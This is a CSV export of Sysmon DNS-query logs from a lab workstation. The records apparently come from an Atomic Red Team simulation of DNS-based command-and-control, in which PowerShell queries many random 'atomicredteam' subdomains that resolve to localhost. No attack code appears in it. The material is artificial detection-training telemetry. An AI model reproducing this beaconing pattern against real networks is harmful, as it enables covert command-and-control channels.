"2025-12-22 13:58:52.083 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166071,"Query: atomicredteam-962626.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.876","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.083 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166072,"Query: atomicredteam-868568.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:50.920","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.084 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166073,"Query: atomicredteam-911924.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.240","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.084 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166074,"Query: atomicredteam-47629.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.284","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.084 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166075,"Query: atomicredteam-209159.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.459","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:52.084 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166076,"Query: atomicredteam-453648.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.639","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.089 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166077,"Query: atomicredteam-149966.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.812","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.090 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166078,"Query: atomicredteam-974121.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:51.856","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.090 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166079,"Query: atomicredteam-807915.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.176","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.090 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166080,"Query: atomicredteam-509280.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.220","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.090 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166081,"Query: atomicredteam-435519.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.263","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166082,"Query: atomicredteam-525110.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.307","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166083,"Query: atomicredteam-927468.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.482","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166084,"Query: atomicredteam-595228.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.525","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166085,"Query: atomicredteam-183103.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.569","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166086,"Query: atomicredteam-76435.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.749","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:53.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166087,"Query: atomicredteam-312861.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.921","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.095 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166088,"Query: atomicredteam-623460.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:52.964","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.095 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166089,"Query: atomicredteam-303469.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.136","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.096 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166090,"Query: atomicredteam-339585.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.179","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.096 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166091,"Query: atomicredteam-189753.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.224","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.096 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166092,"Query: atomicredteam-272658.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.270","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.096 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166093,"Query: atomicredteam-457964.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.315","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.097 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166094,"Query: atomicredteam-671366.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.358","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.097 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166095,"Query: atomicredteam-450169.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.402","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.097 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166096,"Query: atomicredteam-948111.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.097 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166097,"Query: atomicredteam-278018.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.491","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.097 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166098,"Query: atomicredteam-959290.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.535","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.098 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166099,"Query: atomicredteam-924597.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.578","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.098 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166100,"Query: atomicredteam-639464.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.750","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.098 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166101,"Query: atomicredteam-523960.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.794","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.099 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166102,"Query: atomicredteam-478678.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.838","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.099 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166103,"Query: atomicredteam-292784.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.883","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.099 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166104,"Query: atomicredteam-590676.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.927","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.099 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166105,"Query: atomicredteam-109766.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:53.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:54.099 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166106,"Query: atomicredteam-393199.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.011","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.100 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166107,"Query: atomicredteam-505556.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.053","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.100 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166108,"Query: atomicredteam-870755.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.096","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.100 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166109,"Query: atomicredteam-821501.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.140","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.101 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166110,"Query: atomicredteam-143762.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.183","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.101 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166111,"Query: atomicredteam-926169.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.226","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.101 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166112,"Query: atomicredteam-223581.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.269","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.101 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166113,"Query: atomicredteam-212765.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.313","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.102 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166114,"Query: atomicredteam-259541.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.356","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.102 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166115,"Query: atomicredteam-713129.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.678","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.102 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166116,"Query: atomicredteam-460246.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.721","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.102 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166117,"Query: atomicredteam-503445.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.763","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.102 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166118,"Query: atomicredteam-729849.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.808","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
"2025-12-22 13:58:55.103 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",166119,"Query: atomicredteam-728024.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 3232 ¦ PGUID: E9F06A57-4052-6949-5305-000000002100","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-22 12:58:54.851","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004.evtx"
